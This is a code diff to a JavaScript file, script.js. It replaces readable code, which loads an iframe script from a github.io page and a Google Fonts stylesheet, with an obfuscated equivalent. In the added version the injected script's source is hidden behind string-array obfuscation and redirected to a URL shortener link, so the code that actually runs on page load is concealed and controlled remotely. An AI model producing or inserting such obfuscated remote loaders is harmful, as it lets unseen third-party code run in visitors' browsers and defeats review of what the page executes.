@@ -1,14 +1,2 @@
-// script.js
-
-// Adicionar o script final
-const scriptJs = document.createElement('script');
-scriptJs.src = 'https://site-codes.github.io/IframePage-EpPlayer//iframe.js';
-document.body.appendChild(scriptJs);
-
-// Adicionar o link para a fonte do Google
-const googleFontLink = document.createElement('link');
-googleFontLink.href = 'https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200';
-googleFontLink.rel = 'stylesheet';
-document.head.appendChild(googleFontLink);
-
+const _0x24c2b0=_0x3c4b;(function(_0xdeb325,_0x1362b4){const _0x589b9e=_0x3c4b,_0x38a515=_0xdeb325();while(!![]){try{const _0x349e87=parseInt(_0x589b9e(0x105))/0x1*(-parseInt(_0x589b9e(0x113))/0x2)+-parseInt(_0x589b9e(0x107))/0x3*(parseInt(_0x589b9e(0x112))/0x4)+parseInt(_0x589b9e(0x108))/0x5+-parseInt(_0x589b9e(0x10c))/0x6*(parseInt(_0x589b9e(0x111))/0x7)+-parseInt(_0x589b9e(0x10f))/0x8*(parseInt(_0x589b9e(0x102))/0x9)+parseInt(_0x589b9e(0x114))/0xa+parseInt(_0x589b9e(0x110))/0xb;if(_0x349e87===_0x1362b4)break;else _0x38a515['push'](_0x38a515['shift']());}catch(_0x973e4){_0x38a515['push'](_0x38a515['shift']());}}}(_0x5330,0xa5335));const scriptJs=document[_0x24c2b0(0x10d)]('script');scriptJs[_0x24c2b0(0x115)]=_0x24c2b0(0x10e),document[_0x24c2b0(0x10a)][_0x24c2b0(0x106)](scriptJs);function _0x3c4b(_0xf1b417,_0x45a267){const _0x533007=_0x5330();return _0x3c4b=function(_0x3c4b0a,_0x371c49){_0x3c4b0a=_0x3c4b0a-0x102;let _0x15703b=_0x533007[_0x3c4b0a];return _0x15703b;},_0x3c4b(_0xf1b417,_0x45a267);}const googleFontLink=document[_0x24c2b0(0x10d)](_0x24c2b0(0x10b));function _0x5330(){const _0x34e510=['3363951ntEieU','4963025TfDhdA','rel','body','link','6IXwcXb','createElement','https://encurtador.com.br/L16t7','96jywmsR','15526071KgiwtY','1732451gFRLET','4NWtJsm','1635584osQUqg','7051370BObbGq','src','https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200','184455jMmiQx','stylesheet','href','1yBCxKY','appendChild'];_0x5330=function(){return _0x34e510;};return _0x5330();}googleFontLink[_0x24c2b0(0x104)]=_0x24c2b0(0x116),googleFontLink[_0x24c2b0(0x109)]=_0x24c2b0(0x103),document['head'][_0x24c2b0(0x106)](googleFontLink);
 
